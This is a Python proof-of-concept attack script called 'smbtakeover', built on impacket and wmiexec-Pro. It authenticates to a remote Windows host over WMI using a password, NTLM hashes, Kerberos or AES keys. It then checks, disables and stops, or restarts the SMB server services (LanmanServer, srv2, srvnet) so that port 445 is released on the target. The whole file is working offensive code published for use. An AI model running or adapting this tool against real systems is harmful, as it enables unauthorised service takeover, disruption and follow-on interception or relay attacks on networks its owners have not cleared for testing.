#smbtakeover PoC by @zyn3rgy
#heavily based on wmiexec-Pro https://github.com/XiaoliChan/wmiexec-Pro

from __future__ import division
from __future__ import print_function
import sys
import argparse
import time
import logging

from lib.modules.service_mgr import Service_Toolkit
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.dcom import wmi
from impacket.krb5.keytab import Keytab
from six import PY2

WBEM_FLAG_CREATE_ONLY = 0x00000002

OUTPUT_FILENAME = '__' + str(time.time())

class WMIEXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None, options=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__options = options
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            
    

            if self.__options.module == "service":
                executer_Service = Service_Toolkit(iWbemLevel1Login, dcom)
                if self.__options.action:
                        executer_Service.control_Service(self.__options.action, self.__options.service_name)
                else:
                    print("[-] Wrong operation")

            elif self.__options.module == "check":
                executer_Service = Service_Toolkit(iWbemLevel1Login, dcom)
                executer_Service.check_Service("LanmanServer")
                executer_Service.check_Service("srv2")
                serviceIsRunning = executer_Service.check_Service("srvnet")
                if serviceIsRunning:
                    print("\n[+] 445/tcp bound: TRUE\n")
                else:
                    print("\n[+] 445/tcp bound: FALSE\n")

            elif self.__options.module == "start":
                executer_Service = Service_Toolkit(iWbemLevel1Login, dcom)
                executer_Service.control_Service("auto-start", "LanmanServer")
                executer_Service.control_Service("start", "LanmanServer")

            elif self.__options.module == "stop":
                executer_Service = Service_Toolkit(iWbemLevel1Login, dcom)
                executer_Service.control_Service("disable", "LanmanServer")
                executer_Service.control_Service("stop", "LanmanServer")
                executer_Service.control_Service("stop", "srv2")
                executer_Service.control_Service("stop", "srvnet")

        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            dcom.disconnect()
            sys.exit(1)
        
        dcom.disconnect()

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Executes a semi-interactive shell using Windows "
                                                                "Management Instrumentation.")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-codec', default="gbk", action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"gbk"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ')
    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION",
                        help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    subparsers = parser.add_subparsers(help='modules', dest='module')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action='store', metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action='store_true', help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action='store_true',
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action='store', metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-keytab', action='store', help='Read keys for SPN from keytab file')


    # service_mgr.py
    service_MgrParser = subparsers.add_parser('check', help='random action testing')
    service_MgrParser = subparsers.add_parser('start', help='random action testing')
    service_MgrParser = subparsers.add_parser('stop', help='random action testing')





    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    domain, username, password, address = parse_target(options.target)

    try:
        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        executer = WMIEXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, options)
        executer.run(address)
    except KeyboardInterrupt as e:
        logging.error(str(e))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
        sys.exit(1)

    sys.exit(0)
